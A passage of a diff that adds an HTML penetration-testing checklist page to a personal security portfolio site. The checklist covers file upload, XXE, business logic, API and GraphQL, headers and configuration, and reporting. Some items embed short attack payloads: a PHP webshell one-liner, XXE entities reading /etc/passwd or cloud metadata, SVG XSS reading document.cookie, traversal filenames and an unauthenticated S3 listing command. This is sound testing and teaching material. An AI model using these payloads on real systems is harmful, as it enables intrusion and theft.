+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Unrestricted file type — upload PHP/JSP/ASPX webshell directly</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">MIME type bypass — send <code>Content-Type: image/png</code> with <code>&lt;?php system($_GET['cmd']);?&gt;</code> body</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Double extension: <code>file.php.jpg</code>, <code>file.php5</code>, <code>file.phtml</code>, <code>file.shtml</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Null byte: <code>file.php%00.jpg</code> truncates extension at null byte in C-based parsers</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Path traversal in filename — <code>../../../var/www/html/shell.php</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Zip Slip — archive containing <code>../../evil.php</code> path entries overwrites server files</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Polyglot files — valid image + embedded PHP/JS — passes image validation, executes as script</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">SVG XSS — <code>&lt;svg xmlns="..."&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/svg&gt;</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Files stored in web-accessible directory — uploaded file URL directly accessible, no execution prevention</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">ImageMagick — test for ImageTragick (<code>|</code> in filename) if image processing is present</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">File upload size limit absent — DoS via large file upload exhausting disk/memory</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Filename stored and later reflected in HTML — stored XSS via upload filename</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">XXE — XML External Entity</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Classic file read: <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&amp;xxe;</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Blind OOB XXE — DNS callback via interactsh/Burp Collaborator to confirm parsing</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">XXE → SSRF — <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Parameter entities for blind exfiltration — out-of-band data extraction via DNS/HTTP</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Hidden XML parsers — SVG upload, DOCX/XLSX/PPTX upload, SAML assertions, RSS/Atom feeds</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">XInclude injection — when you can't control DOCTYPE but can inject <code>&lt;xi:include href="file:///etc/passwd"/&gt;</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">SAML XXE — inject external entity in SAML request to authentication endpoint</span><span class="cl-sev sev-c">Crit</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         12 — BUSINESS LOGIC
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-12" data-section="12">
+      <div class="mth-phase-header">
+        <span class="mth-num">12</span>
+        <div><h2 class="mth-phase-title">Business Logic</h2><p class="mth-phase-sub">RACE CONDITIONS · PRICE MANIPULATION · WORKFLOW BYPASS · LIMIT ABUSE</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Race Conditions</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Single-use coupon bypass — concurrent requests via Turbo Intruder Last-Byte Sync</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Gift card redemption — parallel redemption of same code depletes balance multiple times</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Credit/balance double-spend — concurrent withdrawal/transfer requests exceed balance</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Vote/like counter manipulation — parallel requests to inflate counts</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Referral bonus race — refer yourself via multiple accounts simultaneously</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">TOCTOU — check-then-act delays exploitable between permission check and privileged operation</span><span class="cl-sev sev-c">Crit</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Price &amp; Quantity Manipulation</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Modify price field in checkout request — <code>"price": 0.01</code> or <code>"price": -1</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Negative quantity — <code>"quantity": -1</code> results in credit being added to account</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Integer overflow — <code>"quantity": 2147483648</code> wraps to negative value</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Apply coupon to excluded items — send coupon code with item IDs that shouldn't qualify</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Currency manipulation — switch currency between adding to cart and checkout</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Workflow &amp; State Bypass</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Skip steps in multi-stage flows — jump from step 1 directly to step 3 via direct URL</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Access post-payment features before completing payment</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Reuse one-time confirmation tokens (email link, invite, reset) after they've been consumed</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Bypass email verification — access account features before verifying email</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Complete steps in reverse order — submit step 3 before step 2</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Reactivate cancelled subscriptions / reinstated deleted resources by re-sending old requests</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Limit &amp; Quota Abuse</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">API rate limit — exceed plan quota without payment by rotating keys or using admin endpoints</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Free tier limit bypass — use enterprise features without upgrading</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Storage quota bypass — circumvent file storage limits via chunked upload or metadata manipulation</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Invitation limit — generate unlimited invites beyond account plan limit</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Self-referral — refer yourself via secondary account to earn unlimited referral bonuses</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         13 — API & GRAPHQL
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-13" data-section="13">
+      <div class="mth-phase-header">
+        <span class="mth-num">13</span>
+        <div><h2 class="mth-phase-title">API &amp; GraphQL Security</h2><p class="mth-phase-sub">REST · GRAPHQL · WEBSOCKET · MASS ASSIGNMENT · IMPROPER ASSETS</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">REST API</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">BOLA — test every <code>/api/resource/{id}</code> endpoint with another user's ID</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Missing auth on bulk / export / admin endpoints — <code>/api/users</code>, <code>/api/admin/stats</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Mass assignment — POST/PUT extra JSON fields the UI doesn't show: <code>role</code>, <code>verified</code>, <code>balance</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">API versioning gaps — <code>/api/v1</code> lacks auth checks added to <code>/api/v3</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Verbose error responses — stack traces, DB query strings, internal class names in errors</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">HTTP verb not checked — PUT/DELETE accepted on read-only endpoints</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Missing <code>Content-Type</code> enforcement — JSON API accepts <code>text/plain</code> body (CSRF vector)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Pagination abuse — large <code>limit</code> or <code>per_page</code> values return all records, bypassing UI pagination</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">GraphQL Security</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Introspection enabled — dump full schema: all types, queries, mutations, subscriptions</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Field suggestion attack — even with introspection disabled, field suggestions reveal schema</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Unauthenticated admin mutations — <code>deleteUser</code>, <code>updateRole</code>, <code>createAdmin</code> without auth check</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Batch query DoS — send 10,000 nested queries in a single request to exhaust CPU/memory</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Circular query depth attack — deeply nested recursive query without depth limit</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Field-level auth gaps — mutation requires auth but individual field resolvers don't enforce it</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">IDOR via GraphQL node IDs — <code>id: "VXNlcjox"</code> base64 decoded = <code>User:1</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">GraphQL SQLi / SSTI — user-controlled arguments passed to resolver without sanitisation</span><span class="cl-sev sev-c">Crit</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">WebSockets</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">WebSocket messages not authenticated — send messages as unauthenticated user</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">CSRF via WebSocket handshake — no <code>Origin</code> check on upgrade request</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">XSS → WebSocket hijack — steal live session by hijacking authenticated WebSocket connection</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">IDOR in WebSocket messages — substitute other users' IDs in <code>subscribe</code> / <code>join</code> messages</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Injection in WebSocket message content — SQLi, SSTI, command injection in message fields</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Mobile &amp; Improper Assets</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Android APK reverse engineering — jadx / apktool — extract hardcoded API endpoints, keys</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">iOS IPA analysis — otool / frida — runtime inspection for auth logic, pinned certs</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Certificate pinning bypass — Frida / Objection to intercept HTTPS from mobile apps</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Debug / internal API endpoints left in production — discovered via mobile app strings</span><span class="cl-sev sev-c">Crit</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         14 — HEADERS & CONFIGURATION
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-14" data-section="14">
+      <div class="mth-phase-header">
+        <span class="mth-num">14</span>
+        <div><h2 class="mth-phase-title">Headers, Config &amp; Infrastructure</h2><p class="mth-phase-sub">CSP · HSTS · TLS · CLOUD MISCONFIG · DESERIALISATION · CACHE</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Security Headers</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">CSP present and not using <code>unsafe-inline</code>, <code>unsafe-eval</code>, or wildcard <code>*</code> sources</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text"><code>X-Frame-Options: DENY</code> or <code>Content-Security-Policy: frame-ancestors 'none'</code></span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text"><code>X-Content-Type-Options: nosniff</code> prevents MIME sniffing attacks</span><span class="cl-sev sev-l">Low</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text"><code>Strict-Transport-Security</code> with <code>max-age ≥ 31536000</code> and <code>includeSubDomains</code></span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text"><code>Referrer-Policy</code> set to restrict leakage of sensitive URLs in Referer header</span><span class="cl-sev sev-l">Low</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text"><code>Permissions-Policy</code> restricts camera, microphone, geolocation, payment APIs</span><span class="cl-sev sev-l">Low</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text">Server banner suppressed — <code>Server: Apache/2.4.51</code> reveals version; should be hidden</span><span class="cl-sev sev-l">Low</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text"><code>X-Powered-By</code>, <code>X-AspNet-Version</code> removed from responses</span><span class="cl-sev sev-l">Low</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">TLS / SSL</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">TLS 1.0 / 1.1 still supported — deprecated, vulnerable to POODLE/BEAST</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Weak cipher suites — RC4, 3DES, export-grade ciphers, NULL cipher</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Mixed content — HTTP resources (scripts, images) loaded on HTTPS page</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Certificate validity, correct CN/SAN, not expired, from trusted CA</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">HTTP to HTTPS redirect enforced — plain HTTP not accepted at all</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Cloud &amp; Infrastructure</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">S3 bucket public read/write — <code>aws s3 ls s3://bucket-name --no-sign-request</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">GCP Cloud Storage / Azure Blob publicly accessible without authentication</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Default credentials on exposed services — admin/admin, admin/password, root/root</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Debug mode in production — stack traces, debug endpoints, verbose error pages</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Spring Boot Actuator — <code>/actuator/env</code>, <code>/actuator/heapdump</code>, <code>/actuator/mappings</code> exposed</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Kubernetes dashboard exposed publicly without authentication</span><span class="cl-sev sev-c">Crit</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Deserialisation &amp; Cache Poisoning</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Java / PHP / Python deserialisation — serialised objects in cookies, session tokens, request params</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Java deserialisation — <code>aced0005</code> hex prefix in base64 → ysoserial gadget chain</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">PHP object injection — <code>O:8:"UserObj":1:{...}</code> in cookie / session</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Web cache poisoning — unkeyed headers (<code>X-Forwarded-Host</code>) stored in cache and served to others</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Cache deception — <code>/account.css</code> served as authenticated response, cached publicly</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">HTTP request smuggling — TE.CL or CL.TE desync between front-end proxy and back-end server</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         15 — REPORTING
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-15" data-section="15">
+      <div class="mth-phase-header">
+        <span class="mth-num">15</span>
+        <div><h2 class="mth-phase-title">Reporting &amp; Disclosure</h2><p class="mth-phase-sub">CVSS · POC · IMPACT · REMEDIATION · RESPONSIBLE DISCLOSURE</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Pre-Submission Quality Gates</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Every finding has a step-by-step reproducible PoC — exact HTTP requests included</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Severity scored with CVSS v3.1 — all 8 base metrics defined (AV/AC/PR/UI/S/C/I/A)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Real-world impact statement — concrete, specific harm, not just "attacker could..."</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">OWASP Top 10 category and CWE ID mapped for every finding</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Concrete, actionable remediation — code-level or config-level guidance, not just "validate input"</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Findings chained — low + low = high impact demonstrated explicitly in the report</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Sensitive data (PII, credentials found) redacted or anonymised in report body</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Screenshots / video PoC attached — visual evidence strengthens severity justification</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Responsible disclosure timeline followed — vendor notified privately before any public disclosure</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Duplicate check — search public bug trackers / disclosed reports before submitting</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Finding Structure Template</p>
+          <div class="cl-template">
+            <p><span class="cl-t-label">Title</span> "IDOR in /api/v1/orders/{id} Allows Horizontal Access to Any User's Order Data"</p>
+            <p><span class="cl-t-label">Severity</span> High — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (7.1)</p>
+            <p><span class="cl-t-label">OWASP</span> A01:2021 Broken Access Control — CWE-284</p>
+            <p><span class="cl-t-label">Summary</span> 2–3 sentence description of the vulnerability and root cause</p>
+            <p><span class="cl-t-label">Steps to Reproduce</span> Numbered steps with exact HTTP requests / curl commands</p>
+            <p><span class="cl-t-label">PoC</span> Burp request screenshot or video recording</p>
+            <p><span class="cl-t-label">Impact</span> An attacker can enumerate all order IDs and read PII/payment method of any customer</p>
+            <p><span class="cl-t-label">Remediation</span> Enforce server-side ownership check: verify requesting user owns the order_id before returning data</p>
+            <p><span class="cl-t-label">References</span> OWASP A01, CWE-284, PortSwigger IDOR lab, CVSS calculator link</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<footer>
+  <p>© 2025 <span class="f-name">Darshak Patel</span> · B.Tech CSE Cybersecurity</p>
+  <div class="f-links">
+    <a href="../index.html">Home</a>
+    <a href="./about.html">About</a>
+    <a href="./expertise.html">Expertise</a>
+    <a href="./certifications.html">Certifications</a>
+    <a href="./achievements.html">Achievements</a>
+    <a href="./tools.html">Tools</a>
+    <a href="./resources.html">Resources</a>
+    <a href="../blog/index.html">Blog</a>
+    <a href="./contact.html">Contact</a>
+  </div>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+<script src="../assets/js/pages/checklist.js"></script>
+</body>
+</html>
